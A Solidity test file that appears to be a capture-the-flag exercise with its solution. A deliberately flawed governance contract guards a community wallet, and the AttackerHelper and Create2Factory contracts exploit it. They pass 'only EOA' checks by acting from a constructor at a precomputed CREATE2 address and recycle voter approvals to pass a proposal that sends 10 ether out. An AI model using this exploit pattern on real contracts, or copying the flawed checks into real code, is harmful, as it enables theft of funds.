// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Address } from '@openzeppelin/contracts/utils/Address.sol';
import { ERC721 } from '@openzeppelin/contracts/token/ERC721/ERC721.sol';
import { IERC721 } from '@openzeppelin/contracts/token/ERC721/IERC721.sol';
import { Ownable } from '@openzeppelin/contracts/access/Ownable.sol';
import { Test, console } from 'forge-std/Test.sol';

contract OligarchyNFT is ERC721 {
  constructor(address attacker) ERC721('Oligarch', 'OG') {
    _mint(attacker, 1);
  }

  function _beforeTokenTransfer(address from, address, uint256, uint256) internal pure {
    require(from == address(0), 'Cannot transfer nft'); // oligarch cannot transfer the NFT
  }
}

contract Governance {
  IERC721 private immutable oligargyNFT;
  CommunityWallet public immutable communityWallet;

  mapping(uint256 => bool) public idUsed;
  mapping(address => bool) public alreadyVoted;

  struct Appointment {
    //approvedVoters: mapping(address => bool),
    uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
    uint256 numAppointments;
    mapping(address => bool) approvedVoter;
  }

  struct Proposal {
    uint256 votes;
    bytes data;
  }

  mapping(address => Appointment) public viceroys;
  mapping(uint256 => Proposal) public proposals;

  constructor(ERC721 _oligarchyNFT) payable {
    oligargyNFT = _oligarchyNFT;
    communityWallet = new CommunityWallet{ value: msg.value }(address(this));
  }

  // CommunityWallet-exex() <= executeProposal (proposals[proposal].votes >= 10)
  // get votes need to call voteOnProposal / create proposal + msg.sender needs approvedVoter + !alreadyVoted
  // createProposal <= msg.sender is a viceroy + approveVoter

  /*
   * @dev an oligarch can appoint a viceroy if they have an NFT
   * @param viceroy: the address who will be able to appoint voters
   * @param id: the NFT of the oligarch
   */
  function appointViceroy(address viceroy, uint256 id) external {
    console.log('--------------------------------');
    console.log('1_msg.sender', msg.sender);
    console.log('1_viceroy', viceroy);
    console.log('--------------------------------');

    require(oligargyNFT.ownerOf(id) == msg.sender, 'not an oligarch');
    require(!idUsed[id], 'already appointed a viceroy');
    require(viceroy.code.length == 0, 'only EOA');

    idUsed[id] = true;
    viceroys[viceroy].appointedBy = id;
    viceroys[viceroy].numAppointments = 5;
  }

  function deposeViceroy(address viceroy, uint256 id) external {
    require(oligargyNFT.ownerOf(id) == msg.sender, 'not an oligarch');
    require(viceroys[viceroy].appointedBy == id, 'only the appointer can depose');

    idUsed[id] = false;
    delete viceroys[viceroy];
  }

  function approveVoter(address voter) external {
    require(viceroys[msg.sender].appointedBy != 0, 'not a viceroy');
    require(voter != msg.sender, 'cannot add yourself');
    require(!viceroys[msg.sender].approvedVoter[voter], 'cannot add same voter twice');
    require(viceroys[msg.sender].numAppointments > 0, 'no more appointments');
    require(voter.code.length == 0, 'only EOA');

    console.log('--------------------------------');
    console.log('2_msg.sender', msg.sender);
    console.log('2_voter', voter);
    console.log('--------------------------------');

    viceroys[msg.sender].numAppointments -= 1;
    //       attackerHelper            voter
    viceroys[msg.sender].approvedVoter[voter] = true;
  }

  function disapproveVoter(address voter) external {
    require(viceroys[msg.sender].appointedBy != 0, 'not a viceroy');
    require(viceroys[msg.sender].approvedVoter[voter], 'cannot disapprove an unapproved address');
    viceroys[msg.sender].numAppointments += 1;
    delete viceroys[msg.sender].approvedVoter[voter];
  }

  function createProposal(address viceroy, bytes calldata proposal) external {
    require(
      viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
      'sender not a viceroy or voter'
    );

    uint256 proposalId = uint256(keccak256(proposal));
    proposals[proposalId].data = proposal;
  }

  // msg.sender have to be an approved voter && do not voted
  function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
    // console.log('--------------------------------');
    // console.log('viceroy', viceroy);
    // console.log('msg.sender', msg.sender);
    // console.log('approvedVoter', viceroys[viceroy].approvedVoter[msg.sender]);
    // console.log('--------------------------------');
    require(proposals[proposal].data.length != 0, 'proposal not found');
    require(viceroys[viceroy].approvedVoter[msg.sender], 'Not an approved voter'); // viceroy approved by
    require(!alreadyVoted[msg.sender], 'Already voted');

    if (inFavor) {
      proposals[proposal].votes += 1;
    }
    alreadyVoted[msg.sender] = true;
  }

  function executeProposal(uint256 proposal) external {
    require(proposals[proposal].votes >= 10, 'Not enough votes');
    (bool res, ) = address(communityWallet).call(proposals[proposal].data);
    require(res, 'call failed');
  }
}

contract CommunityWallet {
  address public governance;

  constructor(address _governance) payable {
    governance = _governance;
  }

  function exec(address target, bytes calldata data, uint256 value) external {
    require(msg.sender == governance, 'Caller is not governance contract');
    (bool res, ) = target.call{ value: value }(data);
    require(res, 'call failed');
  }

  fallback() external payable {}
}

contract AttackerHelper {
  address public governance;
  address public viceroy;
  address public voter;

  uint256 constant ETH_AMOUNT = 10 ether;
  bytes public proposalData;

  constructor(address _governance, address _viceroy, address _voter) {
    governance = _governance;
    viceroy = _viceroy;
    voter = _voter;
    proposalData = abi.encodeWithSignature('exec(address,bytes,uint256)', _viceroy, '', ETH_AMOUNT);
    Governance(_governance).approveVoter(_voter);
    Governance(_governance).createProposal(_viceroy, proposalData);
    Governance(_governance).disapproveVoter(_voter);
  }
}

contract Create2Factory {
  AttackerHelper public deployedContract;

  function deploy(uint256 _salt, address _governance, address _viceroy, address _voter) external {
    deployedContract = new AttackerHelper{ salt: bytes32(_salt) }(_governance, _viceroy, _voter);
  }

  function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
    return address(uint160(uint256(hash)));
  }

  function getBytecode(address _governance, address _viceroy, address _voter) public pure returns (bytes memory) {
    bytes memory bytecode = type(AttackerHelper).creationCode;
    return abi.encodePacked(bytecode, abi.encode(_governance, _viceroy, _voter));
  }
}
